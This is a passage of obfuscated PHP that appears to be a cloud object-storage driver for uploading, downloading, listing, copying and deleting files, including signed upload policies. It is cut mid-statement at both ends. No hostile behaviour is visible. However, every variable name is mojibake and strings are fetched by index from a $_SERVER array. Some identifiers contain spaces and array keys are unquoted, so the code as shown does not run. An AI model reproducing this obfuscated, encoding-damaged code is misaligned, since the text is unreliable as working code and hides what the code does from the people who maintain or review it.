"\104\141\164\145\x3a{$÷ëåÊ¶Ø}"); return $à©âç‹«; } public function ussRequest($¬úª¾…³, $è…¼Æ¹ = "\x47\x45\x54", $»¾’‰ù = false, $Ş¨ø´¾° = false, $œ•ê£Ã = false) { $î”£ûúƒ =& $_SERVER[ •ŒÓîÆ]; $¬úª¾…³ = trim($¬úª¾…³, $î”£ûúƒ[8]); $æÈÛ¬¸¸ = "\x2f{$this->bucket}\57{$¬úª¾…³}"; $¿¸âòùö = $this->ussHeaders($æÈÛ¬¸¸, $è…¼Æ¹); if ($Ş¨ø´¾°) { $¿¸âòùö = array_merge($¿¸âòùö, $Ş¨ø´¾°); } $è²Ì„÷º = url_request($this->endpoint . $æÈÛ¬¸¸, $è…¼Æ¹, $»¾’‰ù, $¿¸âòùö, $œ•ê£Ã); if (!$è²Ì„÷º) { return array($î”£ûúƒ[1253] => !1, $î”£ûúƒ[1243] => $î”£ûúƒ[1484]); } if (strtolower($è…¼Æ¹) == $î”£ûúƒ[213] || in_array($è²Ì„÷º[$î”£ûúƒ[1253]], array($î”£ûúƒ[268], $î”£ûúƒ[1485]))) { $»¾’‰ù = $è²Ì„÷º[$î”£ûúƒ[1486]]; } else { $»¾’‰ù = json_decode($è²Ì„÷º[$î”£ûúƒ[1243]], !0); if (!$»¾’‰ù) { $»¾’‰ù = $è²Ì„÷º[$î”£ûúƒ[1243]]; } else { if (!$è²Ì„÷º[$î”£ûúƒ[791]] && isset($»¾’‰ù[$î”£ûúƒ[1487]])) { $»¾’‰ù = $»¾’‰ù[$î”£ûúƒ[1487]]; } } } return array($î”£ûúƒ[1253] => $è²Ì„÷º[$î”£ûúƒ[791]], $î”£ûúƒ[1243] => $»¾’‰ù); } public function mkfile($Ÿª©À¸‚, $²ã§”ƒ = '', $îÓÀ©ô = REPEAT_RENAME) { if ($this->setContent($Ÿª©À¸‚, $²ã§”ƒ)) { return $this->getPathOuter($Ÿª©À¸‚); } return !1; } public function mkdir($„Íºë€, $ÃÖ÷’”İ = REPEAT_SKIP) { $€±Ö®­± =& $_SERVER[ •ŒÓîÆ]; $Ü×Šâİî = trim($„Íºë€, $€±Ö®­±[8]); if ($this->_isFolder($Ü×Šâİî)) { return $this->getPathOuter($Ü×Šâİî); } $ŠË²ùÉØ = array($€±Ö®­±[1488]); $ÊîÏ‘İª = $this->ussRequest($Ü×Šâİî, $€±Ö®­±[243], !1, $ŠË²ùÉØ); return $ÊîÏ‘İª[$€±Ö®­±[1253]] ? $this->getPathOuter($Ü×Šâİî) : !1; } public function copyFile($í²¨èø™, $‘Ä‹Ò¦ä) { $­’²ü® =& $_SERVER[ •ŒÓîÆ]; $÷ù¨óùË = array($­’²ü®[1489] . "\57{$this->bucket}\57{$í²¨èø™}", $­’²ü®[1490]); $á—±·®‡ = $this->ussRequest($‘Ä‹Ò¦ä, $­’²ü®[245], !1, $÷ù¨óùË); return $á—±·®‡[$­’²ü®[1253]] ? !0 : $this->getPathOuter($‘Ä‹Ò¦ä); } public function moveFile($ÄúÜãìº, $ç£•“ıú) { $ó›Ş¹Á¨ =& $_SERVER[ •ŒÓîÆ]; $êï‡åğ” = array($ó›Ş¹Á¨[1491] . "\57{$this->bucket}\x2f{$ÄúÜãìº}", $ó›Ş¹Á¨[1490]); $Ï•ˆ«Ä´ = $this->ussRequest($ç£•“ıú, $ó›Ş¹Á¨[245], !1, $êï‡åğ”); return $Ï•ˆ«Ä´[$ó›Ş¹Á¨[1253]] ? !0 : $this->getPathOuter($ç£•“ıú); } public function delFile($¼Àô¸Ëü) { $Ûïé¾©Å =& $_SERVER[ •ŒÓîÆ]; $¶ãÊåö  = $this->ussRequest($¼Àô¸Ëü, $Ûïé¾©Å[1492]); return $¶ãÊåö [$Ûïé¾©Å[1253]] ? !0 : !1; } public function delFolder($ûåğ®âø) { $í¢„£‘ =& $_SERVER[ •ŒÓîÆ]; if (!$this->exist($ûåğ®âø)) { return !0; } $this->listItemCache = !1; $•·ø¹À± = $¸‡üĞµ = array(); $this->fileList($ûåğ®âø, $•·ø¹À±, $¸‡üĞµ, !0); $this->listItemCache = !0; foreach ($¸‡üĞµ as $µß¡âº§) { $›¤íŒÜ = $this->ussRequest($µß¡âº§[$í¢„£‘[32]], $í¢„£‘[1492]); if (!$›¤íŒÜ[$í¢„£‘[1253]]) { return !1; } } foreach ($•·ø¹À± as $öçõÂÔâ) { $›¤íŒÜ = $this->ussRequest($öçõÂÔâ, $í¢„£‘[1492]); if (!$›¤íŒÜ[$í¢„£‘[1253]]) { return !1; } } $›¤íŒÜ = $this->ussRequest($ûåğ®âø, $í¢„£‘[1492]); return $›¤íŒÜ[$í¢„£‘[1253]]; } public function rename($°È³çÑ¿, $Å—ƒµøø) { if ($this->isFile($°È³çÑ¿)) { $Å—ƒµøø = get_path_father($°È³çÑ¿) . $Å—ƒµøø; return $this->moveFile($°È³çÑ¿, $Å—ƒµøø); } return $this->renameObject($°È³çÑ¿, $Å—ƒµøø); } public function fileInfo($¸ùÕê¿, $å‚¿šé‡ = false, $òˆŠÔøğ = array()) { $ÈÂ‘Ú¤ë =& $_SERVER[ •ŒÓîÆ]; $Á¤üª†Â = array($ÈÂ‘Ú¤ë[32] => $this->pathThis($¸ùÕê¿), $ÈÂ‘Ú¤ë[86] => $this->getPathOuter($ÈÂ‘Ú¤ë[8] . $¸ùÕê¿), $ÈÂ‘Ú¤ë[33] => $ÈÂ‘Ú¤ë[216], $ÈÂ‘Ú¤ë[78] => isset($òˆŠÔøğ[$ÈÂ‘Ú¤ë[78]]) ? $òˆŠÔøğ[$ÈÂ‘Ú¤ë[78]] : 0, $ÈÂ‘Ú¤ë[177] => $this->ext($¸ùÕê¿)); if ($å‚¿šé‡) { return $Á¤üª†Â; } $Á¤üª†Â[$ÈÂ‘Ú¤ë[217]] = $Á¤üª†Â[$ÈÂ‘Ú¤ë[87]] = 0; $Á¤üª†Â[$ÈÂ‘Ú¤ë[218]] = $Á¤üª†Â[$ÈÂ‘Ú¤ë[219]] = !0; if (empty($òˆŠÔøğ)) { $òˆŠÔøğ = $this->objectMeta($¸ùÕê¿); if (!$òˆŠÔøğ) { return $Á¤üª†Â; } } $Á¤üª†Â[$ÈÂ‘Ú¤ë[217]] = intval($òˆŠÔøğ[$ÈÂ‘Ú¤ë[1493]]); $Á¤üª†Â[$ÈÂ‘Ú¤ë[87]] = intval($òˆŠÔøğ[$ÈÂ‘Ú¤ë[1494]]); $Á¤üª†Â[$ÈÂ‘Ú¤ë[78]] = $òˆŠÔøğ[$ÈÂ‘Ú¤ë[78]]; return $Á¤üª†Â; } public function folderInfo($Ùá­ì¿ï, $´‚®Ñİ¬ = false) { $„¿Ğß˜À =& $_SERVER[ •ŒÓîÆ]; $øÌ˜›Æ = array($„¿Ğß˜À[32] => $this->pathThis($Ùá­ì¿ï), $„¿Ğß˜À[86] => $this->getPathOuter($„¿Ğß˜À[8] . $Ùá­ì¿ï), $„¿Ğß˜À[33] => $„¿Ğß˜À[77]); if ($´‚®Ñİ¬) { return $øÌ˜›Æ; } $øÌ˜›Æ[$„¿Ğß˜À[217]] = $øÌ˜›Æ[$„¿Ğß˜À[87]] = 0; $øÌ˜›Æ[$„¿Ğß˜À[218]] = $øÌ˜›Æ[$„¿Ğß˜À[219]] = !0; if (empty($ÊˆŸ‰‚Ê)) { $ÊˆŸ‰‚Ê = $this->objectMeta($Ùá­ì¿ï); if (!$ÊˆŸ‰‚Ê) { return $øÌ˜›Æ; } } $øÌ˜›Æ[$„¿Ğß˜À[217]] = intval($ÊˆŸ‰‚Ê[$„¿Ğß˜À[1493]]); $øÌ˜›Æ[$„¿Ğß˜À[87]] = intval($ÊˆŸ‰‚Ê[$„¿Ğß˜À[1494]]); return $øÌ˜›Æ; } private function listObjs($˜ÑåÈ°Ê, $¥“·º¶£ = 0, $ûşùß‘Ü = 1000) { $•¡ÍŠ™õ =& $_SERVER[ •ŒÓîÆ]; $ÀÍöçùŞ = array($•¡ÍŠ™õ[1495], $•¡ÍŠ™õ[1496] . $ûşùß‘Ü); if ($¥“·º¶£) { $ÀÍöçùŞ[] = $•¡ÍŠ™õ[1497] . $¥“·º¶£; } $†§ÜÅÎ® = $this->ussRequest($˜ÑåÈ°Ê, $•¡ÍŠ™õ[247], !1, $ÀÍöçùŞ); return !$†§ÜÅÎ®[$•¡ÍŠ™õ[1253]] ? !1 : $†§ÜÅÎ®[$•¡ÍŠ™õ[1243]]; } private function fileList($Ã‚ÏÓ„ª, &$ˆàÀòÃ÷, &$¸±€¿, $²ß—­¾½ = false) { $ß¬İè‡ =& $_SERVER[ •ŒÓîÆ]; $òµúí÷À = $ß¬İè‡[12]; $É¯Ïˆ÷‡ = 1000; $èœ¤Æ€¬ = rtrim($Ã‚ÏÓ„ª, $ß¬İè‡[8]) . $ß¬İè‡[8]; while (!0) { check_abort(); $áíñşÆ± = $this->listObjs($Ã‚ÏÓ„ª, $òµúí÷À, $É¯Ïˆ÷‡); if (!$áíñşÆ±) { return !1; } $òµúí÷À = isset($áíñşÆ±[$ß¬İè‡[1498]]) ? $áíñşÆ±[$ß¬İè‡[1498]] : $ß¬İè‡[12]; $êí‚Åïà = isset($áíñşÆ±[$ß¬İè‡[1499]]) ? $áíñşÆ±[$ß¬İè‡[1499]] : array(); foreach ($êí‚Åïà as $â½‹å–ñ) { $ïŠµÅ– = $â½‹å–ñ[$ß¬İè‡[33]] == $ß¬İè‡[77] ? !0 : !1; $É’æ³ĞË = ltrim($èœ¤Æ€¬ . $â½‹å–ñ[$ß¬İè‡[32]], $ß¬İè‡[8]) . ($ïŠµÅ– ? $ß¬İè‡[8] : $ß¬İè‡[12]); $ÂüÔá Ñ = array($ß¬İè‡[32] => $É’æ³ĞË, $ß¬İè‡[33] => $ïŠµÅ– ? $ß¬İè‡[77] : $ß¬İè‡[216], $ß¬İè‡[78] => $â½‹å–ñ[$ß¬İè‡[392]], $ß¬İè‡[1494] => $â½‹å–ñ[$ß¬İè‡[1500]]); $this->cacheMethodInfoSet($É’æ³ĞË, $ïŠµÅ–, $ÂüÔá Ñ); if ($ïŠµÅ–) { $ˆàÀòÃ÷[] = $É’æ³ĞË; if ($²ß—­¾½) { $this->fileList($É’æ³ĞË, $ˆàÀòÃ÷, $¸±€¿, $²ß—­¾½); } continue; } $¸±€¿[] = $ÂüÔá Ñ; } if (count($êí‚Åïà) < $É¯Ïˆ÷‡) { break; } } $this->cacheMethodInfoSet($Ã‚ÏÓ„ª, !0); } public function listPath($—»›·×—, $ú“²ò–ª = false) { $ñ²ßìï€ =& $_SERVER[ •ŒÓîÆ]; $‚½À‹ôæ = $û–¿½ÈÔ = array(); $this->fileList($—»›·×—, $‚½À‹ôæ, $û–¿½ÈÔ); foreach ($‚½À‹ôæ as $§Ã˜æ›’ => $¬Ë½œø‹) { $‚½À‹ôæ[$§Ã˜æ›’] = $this->folderInfo($¬Ë½œø‹, $ú“²ò–ª); } foreach ($û–¿½ÈÔ as $§Ã˜æ›’ => $¬Ë½œø‹) { $û–¿½ÈÔ[$§Ã˜æ›’] = $this->fileInfo($¬Ë½œø‹[$ñ²ßìï€[32]], $ú“²ò–ª, $¬Ë½œø‹); } return array($ñ²ßìï€[84] => $‚½À‹ôæ, $ñ²ßìï€[85] => $û–¿½ÈÔ); } public function has($µØõÍš‡, $ºì†åÉÊ = false, $ŠÑçñ«¹ = true) { $€ùê­› =& $_SERVER[ •ŒÓîÆ]; $ˆÙ¶¢Û˜ = $€ùê­›[12]; $ÔæêúÕ = 500; $­Í§–¯Ë = 0; $¾‡±Ò¢é = 0; $ëŞ«· = rtrim($µØõÍš‡, $€ùê­›[8]) . $€ùê­›[8]; while (!0) { check_abort(); $¦…Şñ® = $this->listObjs($µØõÍš‡, $ˆÙ¶¢Û˜, $ÔæêúÕ); if (!$¦…Şñ®) { return !1; } $ˆÙ¶¢Û˜ = isset($¦…Şñ®[$€ùê­›[1498]]) ? $¦…Şñ®[$€ùê­›[1498]] : $€ùê­›[12]; $šì»š• = isset($¦…Şñ®[$€ùê­›[1499]]) ? $¦…Şñ®[$€ùê­›[1499]] : array(); if (empty($šì»š•)) { break; } $¤ïÆ÷Ñ· = array_filter($šì»š•, function ($…œ×ùëá) { $›Ì­¯Öı =& $_SERVER[ •ŒÓîÆ]; return $…œ×ùëá[$›Ì­¯Öı[33]] == $›Ì­¯Öı[77]; }); $•ƒëáé€ = count($šì»š•); $¤ïÆ÷Ñ· = count($¤ïÆ÷Ñ·); $îØÃˆÁ¦ = $•ƒëáé€ - $¤ïÆ÷Ñ·; if ($ºì†åÉÊ) { $¾‡±Ò¢é += $¤ïÆ÷Ñ·; $­Í§–¯Ë += $îØÃˆÁ¦; if ($•ƒëáé€ < $ÔæêúÕ) { break; } continue; } if ($ŠÑçñ«¹) { if ($îØÃˆÁ¦) { return !0; } } else { if ($¤ïÆ÷Ñ·) { return !0; } } if ($•ƒëáé€ < $ÔæêúÕ) { break; } } if ($ºì†åÉÊ) { return array($€ùê­›[225] => $­Í§–¯Ë, $€ùê­›[226] => $¾‡±Ò¢é); } return !1; } public function listAll($–à¸­è©) { $²ÃÔ—‘Ø =& $_SERVER[ •ŒÓîÆ]; $ˆşÀù¦µ = $„òş²à¶ = array(); $this->fileList($–à¸­è©, $ˆşÀù¦µ, $„òş²à¶, !0); $ã¾Àü‹Õ = array_to_keyvalue($„òş²à¶, $²ÃÔ—‘Ø[32]); foreach ($ˆşÀù¦µ as $“©¥øû¢) { if (is_string($“©¥øû¢)) { $ã¾Àü‹Õ[$“©¥øû¢] = array($²ÃÔ—‘Ø[78] => 0); } } return $this->listAllFiles($–à¸­è©, $ã¾Àü‹Õ); } public function canRead($éòÖÖÜ¼) { return $this->exist($éòÖÖÜ¼) ? !0 : !1; } public function canWrite($Äˆ—êıŞ) { return $this->exist($Äˆ—êıŞ) ? !0 : !1; } public function getContent($âÑı¦) { return $this->fileSubstr($âÑı¦, 0, -1); } public function setContent($ç‚í‡Ş£, $ùìŒöî¶ = '') { $í³®‘’ =& $_SERVER[ •ŒÓîÆ]; if (!$ùìŒöî¶) { $¼°«ÂìŠ = $this->ussRequest($ç‚í‡Ş£, $í³®‘’[243]); return $¼°«ÂìŠ[$í³®‘’[1253]]; } $¨È—¢¸ = $this->tempFile($this->pathThis($ç‚í‡Ş£)); file_put_contents($¨È—¢¸, $ùìŒöî¶); if ($this->upload($ç‚í‡Ş£, $¨È—¢¸)) { $this->tempFileRemve($¨È—¢¸); return !0; } return !1; } public function fileSubstr($·¾‚ÈŸ™, $ËšèóÂ¬, $ùÈ™ —„) { $šÇÖüæ® =& $_SERVER[ •ŒÓîÆ]; if (!($‚£Û’°í = $this->link($·¾‚ÈŸ™))) { return !1; } $á¹ÈÛÁÌ = !1; if ($ùÈ™ —„ > 0) { $É“øã´” = $ËšèóÂ¬ + $ùÈ™ —„ - 1; $á¹ÈÛÁÌ = array($šÇÖüæ®[1461] . $ËšèóÂ¬ . $šÇÖüæ®[440] . $É“øã´”); } $ŞÒ˜ğ‡‘ = url_request($‚£Û’°í, $šÇÖüæ®[247], !1, $á¹ÈÛÁÌ); return $ŞÒ˜ğ‡‘[$šÇÖüæ®[791]] ? $ŞÒ˜ğ‡‘[$šÇÖüæ®[1243]] : !1; } public function upload($Å‹ïóºª, $õÍòÄµ«, $Æª¬±Ò = false, $Û€‹µÏ = REPEAT_REPLACE) { $Œø²·Æû =& $_SERVER[ •ŒÓîÆ]; $‘¸Î³ò· = IO::size($õÍòÄµ«); if ($‘¸Î³ò· <= 1024 * 1024 * 200) { $•ÊÂ÷“ = array($Œø²·Æû[1501] . $õÍòÄµ«); $ÇÈª‹Ñ± = $this->ussRequest($Å‹ïóºª, $Œø²·Æû[245], $•ÊÂ÷“); return $ÇÈª‹Ñ±[$Œø²·Æû[1253]] ? $this->getPathOuter($Å‹ïóºª) : !1; } $”¯ˆí¨¶ = 1024 * 1024 * 10; $±³±Ş¥ = array($Œø²·Æû[1502], $Œø²·Æû[1503] . $‘¸Î³ò·, $Œø²·Æû[1504], $Œø²·Æû[1505] . $”¯ˆí¨¶); $ÇÈª‹Ñ± = $this->ussRequest($Å‹ïóºª, $Œø²·Æû[245], !1, $±³±Ş¥); if (!$ÇÈª‹Ñ±[$Œø²·Æû[1253]]) { return !1; } $ªÌÁ…°Ì = $ÇÈª‹Ñ±[$Œø²·Æû[1243]]; $è†ÛŸşâ = 0; $«ô¤«İ  = $ªÌÁ…°Ì[$Œø²·Æû[1506]]; $õÖı‰Ö = fopen($õÍòÄµ«, $Œø²·Æû[1408]); if (!$õÖı‰Ö) { return !1; } do { $óúúÓ‘½ = $ªÌÁ…°Ì[$Œø²·Æû[1507]]; fseek_64($õÖı‰Ö, $è†ÛŸşâ); $Ìş®¾²² = fread($õÖı‰Ö, $óúúÓ‘½); $½áÂî»ú = 0; do { $½áÂî»ú++; $ªÌÁ…°Ì = $this->uploadPart($Å‹ïóºª, $ªÌÁ…°Ì, $Ìş®¾²²); } while (!$ªÌÁ…°Ì && $½áÂî»ú < 3); if (!$ªÌÁ…°Ì) { return !1; } $«ô¤«İ  = $ªÌÁ…°Ì[$Œø²·Æû[1506]]; $è†ÛŸşâ += $óúúÓ‘½; } while ($«ô¤«İ  != -1); fclose($õÖı‰Ö); $±³±Ş¥ = array($Œø²·Æû[1508], $Œø²·Æû[1509] . $ªÌÁ…°Ì[$Œø²·Æû[1510]], $Œø²·Æû[1504]); $ÇÈª‹Ñ± = $this->ussRequest($Å‹ïóºª, $Œø²·Æû[245], !1, $±³±Ş¥); return $ÇÈª‹Ñ±[$Œø²·Æû[1253]] ? $this->getPathOuter($ÊĞµíÕ³) : !1; } private function uploadPart($ŸÄ—¤€ñ, $À¾§Ğµè, &$ñœø°¿«) { $ÊÍ§£×ü =& $_SERVER[ •ŒÓîÆ]; $ı´¿Ô‹ë = array($ÊÍ§£×ü[1511], $ÊÍ§£×ü[1509] . $À¾§Ğµè[$ÊÍ§£×ü[1510]], $ÊÍ§£×ü[1512] . $À¾§Ğµè[$ÊÍ§£×ü[1506]], $ÊÍ§£×ü[145] . $À¾§Ğµè[$ÊÍ§£×ü[1507]]); $Ùî‰®›÷ = $this->ussRequest($ŸÄ—¤€ñ, $ÊÍ§£×ü[245], $ñœø°¿«, $ı´¿Ô‹ë); return !$Ùî‰®›÷[$ÊÍ§£×ü[1253]] ? $Ùî‰®›÷[$ÊÍ§£×ü[1253]] : $Ùî‰®›÷[$ÊÍ§£×ü[1243]]; } public function uploadFormData($Õàâ‹Î¢, $›šâø¯ç = 3600) { return $this->uploadPolicy($Õàâ‹Î¢, $›šâø¯ç); } public function multiUploadFormData($«Á¤Ø“è, $âùÆ°“Ï = 3600) { $‘«æñìÓ =& $_SERVER[ •ŒÓîÆ]; $ÙğØ½²ê = (int) $GLOBALS[$‘«æñìÓ[7]][$‘«æñìÓ[78]]; return $this->uploadPolicy($«Á¤Ø“è, $âùÆ°“Ï, $ÙğØ½²ê); } private function uploadPolicy($»’Ù«à³, $ìˆñ¹¢® = 3600, $Ù¯ÂìÎ = 0) { $ÅÁã²ƒ =& $_SERVER[ •ŒÓîÆ]; $Û˜¯ßÆÍ = $ÅÁã²ƒ[8] . $this->bucket; $˜´ÕöŠ× = gmdate($ÅÁã²ƒ[1447]); $¾îµ’Û” = array($ÅÁã²ƒ[1513] => $this->bucket, $ÅÁã²ƒ[1514] => $»’Ù«à³, $ÅÁã²ƒ[1515] => time() + $ìˆñ¹¢®, $ÅÁã²ƒ[1516] => $˜´ÕöŠ×); if ($Ù¯ÂìÎ) { $¾îµ’Û”[$ÅÁã²ƒ[1428]] = $Ù¯ÂìÎ; } $ÏÈÖ˜Ä = base64_encode(json_encode($¾îµ’Û”)); $›Ä“ª×³ = base64_encode(hash_hmac($ÅÁã²ƒ[1483], "\120\x4f\123\x54\46{$Û˜¯ßÆÍ}\x26{$˜´ÕöŠ×}\x26{$ÏÈÖ˜Ä}", md5("{$this->userpass}"), !0)); $ûÜŸ¡’í = array($ÅÁã²ƒ[287] => $ÏÈÖ˜Ä, $ÅÁã²ƒ[1517] => "\x55\x50\x59\125\x4e\x20{$this->username}\x3a{$›Ä“ª×³}", $ÅÁã²ƒ[198] => $this->endpoint . $Û˜¯ßÆÍ); return $ûÜŸ¡’í; } public function download($Õ¿ø ß´, $¼ëİ€²) { $ß»‘¶Ë¤ = IO::getPathInner(IO::mkfile($¼ëİ€²)); if (!($ Ì¸Æ½ô = $this->link($Õ¿ø ß´))) { return !1; } $£Ìøšƒ¯ = 0; $ãï®İĞš = 1024 * 200; $îıÅÛ²ƒ = fopen($ß»‘¶Ë¤, $_SERVER[ •ŒÓîÆ][1467]); while (!0) { $˜ğ–Å½ª = $this->fileSubstr($Õ¿ø ß´, $£Ìøšƒ¯, $ãï®İĞš); if ($˜ğ–Å½ª === !1) { return !1; } fwrite($îıÅÛ²ƒ, $˜ğ–Å½ª); $£Ìøšƒ¯ += $ãï®İĞš; if (strlen($˜ğ–Å½ª) < $ãï®İĞš) { break; } } fclose($îıÅÛ²ƒ); return $¼ëİ€²; } public function link($ëŒ‡ß„ê, $ŸØÎš…Ã = array()) { $¹ÉµäŸ§ =& $_SERVER[ •ŒÓîÆ]; $ëŒ‡ß„ê = trim($ëŒ‡ß„ê, $¹ÉµäŸ§[8]); if (!empty($this->token)) { $¯ŸÖ´Æ = strtotime(date($¹ÉµäŸ§[1518])); $ÕÎˆä³ñ = substr(md5($this->token . $¹ÉµäŸ§[339] . $¯ŸÖ´Æ . $¹ÉµäŸ§[1519] . $ëŒ‡ß„ê), 12, 8) . $¯ŸÖ´Æ; $ŸØÎš…Ã[] = $¹ÉµäŸ§[1520] . $ÕÎˆä³ñ; } $ñ¿™Ö¨ = !empty($ŸØÎš…Ã) ? $¹ÉµäŸ§[75] . implode($¹ÉµäŸ§[339], $ŸØÎš…Ã) : $¹ÉµäŸ§[12]; return $this->getHost() . $¹ÉµäŸ§[8] . $ëŒ‡ß„ê . $ñ¿™Ö¨; } public function fileOut($Õ„ÁØ¸, $ ¦Â‚ºÒ = false, $¹´Æ÷áİ = false, $¤ İ¯±Ö = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Õ„ÁØ¸, $ ¦Â‚ºÒ, $¹´Æ÷áİ, $¤ İ¯±Ö); } if (!$¹´Æ÷áİ) { $¹´Æ÷áİ = $this->pathThis($Õ„ÁØ¸); } $‰‚óëõã = $ ¦Â‚ºÒ ? array($_SERVER[ •ŒÓîÆ][1521] . rawurlencode($¹´Æ÷áİ)) : array(); $äÏÅŸ› = $this->link($Õ„ÁØ¸, $‰‚óëõã); $this->fileOutLink($äÏÅŸ›); } public function fileOutServer($º¹½çÉº, $ÙÑúÑ…í = false, $‡…ûÏ¥º = false, $×†›ŒÓò = '') { parent::fileOut($º¹½çÉº, $ÙÑúÑ…í, $‡…ûÏ¥º, $×†›ŒÓò); } public function fileOutImage($šÍüÌ»å, $æ—ïÔ½’ = 250) { $ìŠã¡º² = $this->link($šÍüÌ»å . $_SERVER[ •ŒÓîÆ][1522] . $æ—ïÔ½’); $this->fileOutLink($ìŠã¡º²); } public function fileOutImageServer($ï£™úğ, $Ù×›©ÉÓ = 250) { parent::fileOutImage($ï£™úğ, $Ù×›©ÉÓ); } public function hashMd5($©æÕ¥‹) { $ˆ¸ÂÍµ  =& $_SERVER[ •ŒÓîÆ]; $ŞêúÊËÈ = $this->_objectMeta($©æÕ¥‹); return isset($ŞêúÊËÈ[$ˆ¸ÂÍµ [230]]) ? $ŞêúÊËÈ[$ˆ¸ÂÍµ [230]] : !1; } public function size($€ı ıÂ) { $¯Éè³— = $this->objectMeta($€ı ıÂ); return $¯Éè³— ? $¯Éè³—[$_SERVER[ •ŒÓîÆ][78]] : 0; } public function info($æ‹Ï‹ Î) { if ($this->isFolder($æ‹Ï‹ Î)) { return $this->folderInfo($æ‹Ï‹ Î); } else { if ($this->isFile($æ‹Ï‹ Î)) { return $this->fileInfo($æ‹Ï‹ Î); } } return !1; } public function exist($“Œ˜¾£©) { return $this->isFile($“Œ˜¾£©) || $this->isFolder($“Œ˜¾£©); } public function isFile($ÅÊÌ›†) { return !$this->isFolder($ÅÊÌ›†) && $this->objectMeta($ÅÊÌ›†); } public function isFolder($—à®Á¥) { return $this->cacheMethod($_SERVER[ •ŒÓîÆ][168], $—à®Á¥); } protected function objectMeta($¸Œ¨ö¹Ä) { return $this->cacheMethod($_SERVER[ •ŒÓîÆ][170], $¸Œ¨ö¹Ä); } protected function _objectMeta($óë±™Ç­) { $Åš¢öÖÀ =& $_SERVER[ •ŒÓîÆ]; if ($óë±™Ç­ == $Åš¢öÖÀ[12] || $óë±™Ç­ == $Åš¢öÖÀ[8]) { return array(); } $…Ş¹óè® = $this->ussRequest($óë±™Ç­, $Åš¢öÖÀ[1523]); if (!$…Ş¹óè®[$Åš¢öÖÀ[1253]]) { return null; } $­ÆÄê ™ = isset($…Ş¹óè®[$Åš¢öÖÀ[1243]]) ? $…Ş¹óè®[$Åš¢öÖÀ[1243]] : array(); if (!isset($­ÆÄê ™[$Åš¢öÖÀ[1524]])) { return null; } $âÆÊ³Ú  = array($Åš¢öÖÀ[33] => isset($­ÆÄê ™[$Åš¢öÖÀ[1524]]) ? $­ÆÄê ™[$Åš¢öÖÀ[1524]] : null, $Åš¢öÖÀ[78] => isset($­ÆÄê ™[$Åš¢öÖÀ[1525]]) ? $­ÆÄê ™[$Åš¢öÖÀ[1525]] : null, $Åš¢öÖÀ[230] => isset($­ÆÄê ™[$Åš¢öÖÀ[1526]]) ? $­ÆÄê ™[$Åš¢öÖÀ[1526]] : null, $Åš¢öÖÀ[1493] => isset($­ÆÄê ™[$Åš¢öÖÀ[1527]]) ? $­ÆÄê ™[$Åš¢öÖÀ[1527]] : null); $âÆÊ³Ú [$Åš¢öÖÀ[1494]] = isset($­ÆÄê ™[$Åš¢öÖÀ[1528]]) ? strtotime($­ÆÄê ™[$Åš¢öÖÀ[1528]]) : $âÆÊ³Ú [$Åš¢öÖÀ[1493]]; return $âÆÊ³Ú ; } protected function _isFolder($“èÄê¶¸) { $à†Ú¬Áà =& $_SERVER[ •ŒÓîÆ]; if ($“èÄê¶¸ == $à†Ú¬Áà[12] || $“èÄê¶¸ == $à†Ú¬Áà[8]) { return !0; } $Ÿ™À¦‹® = $this->_objectMeta($“èÄê¶¸); return isset($Ÿ™À¦‹®[$à†Ú¬Áà[33]]) && $Ÿ™À¦‹®[$à†Ú¬Áà[33]] == $à†Ú¬Áà[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($‘‹¸²™€ = false) { } public function exist($õ¡¶ñ™–) { $â×šë´‰ = $this->info($õ¡¶ñ™–); return $â×šë´‰[$_SERVER[ •ŒÓîÆ][218]]; } public function isFile($°Ò“ ÃÛ) { $¾ù¶¸ £ = $this->info($°Ò“ ÃÛ); return $¾ù¶¸ £[$_SERVER[ •ŒÓîÆ][218]]; } public function isFolder($åº·ì»÷) { return !1; } public function size($ƒşÖøãÉ) { $Ê••š£¬ = $this->info($ƒşÖøãÉ); return $Ê••š£¬[$_SERVER[ •ŒÓîÆ][78]]; } public function info($öãÕ€şÇ) { return $this->infoParse($öãÕ€şÇ); } public function infoAuth($›‹ŠÅõ) { return $this->infoParse($›‹ŠÅõ); } public function infoWithChildren($ÄÍ–Ã²ñ) { return $this->infoParse($ÄÍ–Ã²ñ); } public function infoFull($›Õ©¿ëÚ) { return $this->infoParse($›Õ©¿ëÚ); } private function infoParse($…öÊ¯Ä‹) { $ú†è¥Îë =& $_SERVER[ •ŒÓîÆ]; $‡õá«Ù = $this->header($…öÊ¯Ä‹); if (!$‡õá«Ù || !$‡õá«Ù[$ú†è¥Îë[791]]) { return !1; } $Ûàç© = _get($‡õá«Ù, $ú†è¥Îë[392], 0); $®™Ãªñä = array($ú†è¥Îë[32] => $‡õá«Ù[$ú†è¥Îë[32]], $ú†è¥Îë[86] => $…öÊ¯Ä‹, $ú†è¥Îë[33] => $ú†è¥Îë[216], $ú†è¥Îë[78] => intval($Ûàç©), $ú†è¥Îë[177] => get_path_ext($‡õá«Ù[$ú†è¥Îë[32]]), $ú†è¥Îë[1405] => $Ûàç© > 0 && $‡õá«Ù[$ú†è¥Îë[1529]], $ú†è¥Îë[1406] => !1); return $®™Ãªñä; } private function header($Ş‹ù¸Š) { $™ÈİÕô =& $_SERVER[ •ŒÓîÆ]; if (isset(self::$_cacheHeader[$Ş‹ù¸Š])) { return self::$_cacheHeader[$Ş‹ù¸Š]; } $œ°Æ±ó = isset($GLOBALS[$™ÈİÕô[1530]]) ? $GLOBALS[$™ÈİÕô[1530]] : !1; $GLOBALS[$™ÈİÕô[1530]] = !0; self::$_cacheHeader[$Ş‹ù¸Š] = url_header($Ş‹ù¸Š); $GLOBALS[$™ÈİÕô[1530]] = $œ°Æ±ó; return self::$_cacheHeader[$Ş‹ù¸Š]; } public function hashSimple($öŸÚˆÁÌ, $ºÇæÙÕö = false) { $ÊÑ·”Ñ =& $_SERVER[ •ŒÓîÆ]; $ñŞêõïû = $this->info($öŸÚˆÁÌ); if (!$ñŞêõïû || !$ñŞêõïû[$ÊÑ·”Ñ[218]]) { return !1; } $İÃö©óà = $ñŞêõïû[$ÊÑ·”Ñ[78]]; $ÓÖğù¯ã = 200; $²¹ğù±€ = 50; if ($İÃö©óà <= $ÓÖğù¯ã * $²¹ğù±€) { return md5($this->fileSubstr($öŸÚˆÁÌ, 0, $İÃö©óà)) . $İÃö©óà; } $ğ‡Ë€»€ = intval($İÃö©óà / $²¹ğù±€); $å³Øó•— = $ÊÑ·”Ñ[12]; $İü“‡œã = timeFloat(); $‹¦¥‚êĞ = 15; for 